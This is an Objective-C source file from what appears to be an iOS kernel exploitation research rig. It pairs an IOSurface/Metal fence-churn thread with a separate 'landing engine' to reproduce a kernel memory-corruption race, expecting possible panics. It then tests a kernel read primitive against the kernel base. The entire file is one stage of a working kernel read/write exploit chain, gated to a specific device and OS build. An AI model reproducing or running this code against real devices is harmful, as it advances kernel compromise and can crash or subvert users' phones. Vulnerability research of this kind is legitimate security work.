//
//  P130FenceSecondTable.m — fence churn x the p073 landing engine. p130.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Provenance: notes 288/289 + the p127/p128/p129 falsifications. The
//  2/2 fence-append aborts (0x984faf8, range cluster 0x984fcc8, OUR
//  fill-staging sids in x5) fired exactly when a record write LANDED —
//  and only p073 produces landings (positioned 0x820 prefill neighbors,
//  LIFO two-table discipline, 254-in post-marshal fires; the 23H30 iPad
//  round hit the translation bar on the forged desc). This tap pairs
//  them: thread A = the p127 fence churn body (IOSurface Metal blits +
//  recycle; engine-driven fence teardown/drain/append), thread B =
//  [P073AneSecondTable tap] (serialized; its own dial/log/bandit
//  untouched). A caught-in-the-act 0x984fcc8 panic = the corrupt-count
//  window LIVE with the historical pair. PANIC-POSSIBLE; one tap per
//  force-quit; honest stage-3 KRW self-test; no conversion claims.
//

#import "P130FenceSecondTable.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "P073AneSecondTable.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P130_BUILD   @"p130-fencesecondtable-v1"
#define P130_SURF_W  64
#define P130_SURF_H  64
#define P130_RECYCLE 8

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSString *P130R(void);

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static atomic_int g_stop;
static atomic_ulong ga_rounds, ga_commits, ga_recycles, ga_fails;
static CFMutableDictionaryRef g_dict;
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;

static void p130_law_dict(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = P130_SURF_W, h = P130_SURF_H, bpe = 4,
            bpr = P130_SURF_W * 4, as = P130_SURF_W * P130_SURF_H * 4;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef ne = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpr);
    CFNumberRef na = CFNumberCreate(NULL, kCFNumberSInt32Type, &as);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ne);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), nr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(ne); CFRelease(nr); CFRelease(na);
    g_dict = d;
}

/* thread A: the p127 fence churn body (with recycle) */
static void *p130_fencer(void *u) {
    (void)u;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P130_SURF_W height:P130_SURF_H
         mipmapped:NO];
    td.storageMode = MTLStorageModeShared;
    unsigned long r = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            if (r % P130_RECYCLE == 0) {
                for (int k = 0; k < 2; k++) {
                    if (tex[k]) tex[k] = NULL;
                    if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
                }
                for (int k = 0; k < 2; k++) {
                    void *s = g_surfCreate(g_dict);
                    if (!s) { atomic_fetch_add(&ga_fails, 1); continue; }
                    tex[k] = [dev newTextureWithDescriptor:td
                                                 iosurface:(IOSurfaceRef)s
                                                     plane:0];
                    surfaces[k] = s;
                    if (!tex[k]) atomic_fetch_add(&ga_fails, 1);
                }
                atomic_fetch_add(&ga_recycles, 1);
            }
            if (!tex[0] || !tex[1]) { r++;
              [NSThread sleepForTimeInterval:0.01]; continue; }
            id<MTLCommandBuffer> cb = [q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
               sourceOrigin:MTLOriginMake(0,0,0)
               sourceSize:MTLSizeMake(P130_SURF_W, P130_SURF_H, 1)
               toTexture:tex[1] destinationSlice:0 destinationLevel:0
               destinationOrigin:MTLOriginMake(0,0,0)];
            [e endEncoding];
            [cb commit];
            [cb waitUntilCompleted];
            atomic_fetch_add(&ga_commits, 1);
            r++;
            atomic_store(&ga_rounds, r);
        }
    }
    for (int k = 0; k < 2; k++) {
        if (tex[k]) tex[k] = NULL;
        if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
    }
    return NULL;
}

static void p130_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p130", arms, 1, &sr, 0, "p130 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p130", 0, outcome);
}

@implementation P130FenceSecondTable

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:
                  @"p130_fencesecondtable_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p130 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P130_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the FUSION: fence churn x the p073 landing engine (only");
    L(@"  p073 produces record LANDINGS: positioned 0x820 prefill +");
    L(@"  254-in post-marshal fires). The 2/2 fence-append aborts fired");
    L(@"  exactly when a record write landed; this pair reproduces it.");
    L(@"  PANIC-POSSIBLE; one tap per force-quit; kread32 = the only gate.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p130"];
    if (stop) { L(stop); p130_bandit("gated"); return P130R(); }

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosf) { L(@"[-] STOP dlopen"); p130_bandit("nodlopen"); return P130R(); }
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!g_surfCreate || !g_surfID) {
        L(@"[-] STOP dlsym"); p130_bandit("nodlsym"); return P130R();
    }
    p130_law_dict();

    /* ---- thread A starts, then the p073 engine fires ---- */
    L(@"--- stage 1: fence churn STARTS, then the p073 engine fires ---");
    L(@"[IN FLIGHT] co-driver pair live - one tap per force-quit.");
    unsigned long c0 = atomic_load(&ga_commits), r0 = atomic_load(&ga_rounds);
    atomic_store(&g_stop, 0);
    pthread_t ta;
    pthread_create(&ta, NULL, p130_fencer, NULL);
    /* thread B: the landing engine, serialized to one call */
    NSString *p073log = [P073AneSecondTable tap];
    atomic_store(&g_stop, 1);
    pthread_join(ta, NULL);
    unsigned long c1 = atomic_load(&ga_commits), r1 = atomic_load(&ga_rounds);
    Lf(@"  engine done; fence churn during it: commits=%lu rounds=%lu "
       @"recycles=%lu fails=%lu survived=YES in-tap",
       c1 - c0, r1 - r0,
       (unsigned long)atomic_load(&ga_recycles),
       (unsigned long)atomic_load(&ga_fails));
    L(@"--- stage 2: the p073 engine log (its own file unchanged) ---");
    if (p073log.length) {
        L(p073log.length > 10000
          ? [@"[p073 head/truncated]\n" stringByAppendingString:
             [p073log substringToIndex:10000]]
          : p073log);
    } else {
        L(@"  [p073 returned empty - honest note]");
    }

    /* ---- honest KRW self-test ---- */
    L(@"--- stage 3 KRW SELF-TEST (honest gate) ---");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this tap. Honest.");
        p130_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p130_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p130_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    L(@"  [read law] a post-tap 0x984fcc8-band panic = the append range");
    L(@"  cluster catching OUR co-driver pair = the corrupt-count window");
    L(@"  LIVE with the historical condition reproduced. A D2-style");
    L(@"  descForged or mutated sentinel = the conversion bar, not KRW.");
    Lf(@"=== p130 end %@ ===", LabLocalMilitaryNow());
    return P130R();
}

static NSString *P130R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end